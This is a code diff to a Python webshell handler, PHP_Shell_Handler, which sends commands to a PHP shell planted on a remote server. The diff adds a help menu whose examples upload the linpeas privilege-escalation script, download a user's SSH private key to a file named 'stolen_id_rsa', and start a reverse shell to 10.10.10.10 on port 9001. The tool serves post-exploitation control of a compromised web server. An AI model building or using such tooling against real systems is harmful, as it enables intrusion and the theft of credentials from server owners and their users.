@@ -5,9 +5,8 @@ import binascii
 import os
 import argparse
 
-# test change
-
 basepath = os.path.dirname(os.path.abspath(__file__))
+
 
 class PHP_Shell_Handler:
     def __init__(self, webshell_url, webshell_get_param="phpshellcmd", encoded=True):
@@ -61,6 +60,18 @@ class PHP_Shell_Handler:
     def catch_reverse_shell(self):
         pass
 
+    def show_help(self):
+        print("[*] - COMMAND HELP:")
+        print("\n\t[ UPLOAD ] - 'upload localfilepath remotefilepath' - uploads a file to the server, from 'localfilepath' on your machine, to 'remotefilepath' on the remote machine\n" +
+            "\tEXAMPLE: upload /opt/linpeas.sh /tmp/linpeas.sh")
+        print("\n\t[ DOWNLOAD ] - 'download remotefilepath localfilepath' - downloads a file from the server, from 'remotefilepath' on the target machine, to 'localfilepath' on your machine\n" +
+            "\tEXAMPLE: download /home/user/.ssh/id_rsa /home/watchdog/stolen_id_rsa")
+        print("\n\t[ SWITCHSHELL ] - 'switchshell current_shellfile new_shellfile' - switches the file currently used by the shell handler to a new file (often for switching between encoded and non encoded shells)\n" +
+            "\tEXAMPLE: switchshell /path/to/shell.php /path/to/newshell.php")
+        print("\n\t[ SHELL ] - 'shell listening_ip listening_port' - attempts to run a reverse shell to give shell access to listening_ip on listening_port\n" +
+            "\tEXAMPLE: shell 10.10.10.10 9001")
+        print("\n\t[ QUIT (or EXIT) ] - 'quit' - quits the current session and exits the program (also works with 'exit')")
+
     def shell(self):
         shell_filename = basepath +"/phpshells/shell.php"
         if self.encoded:
@@ -89,12 +100,14 @@ class PHP_Shell_Handler:
             elif cmd.upper().startswith("SHELL"):
                 self.catch_reverse_shell()
 
+            elif cmd.upper() == ("HELP"):
+                self.show_help()
+
             elif cmd.upper() == "QUIT" or cmd.upper() == "EXIT":
                 sys.exit(1)
-                
+
             else:
                 print(self._exec_cmd(cmd))
-
 
 
 def main():
@@ -125,5 +138,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-        
-
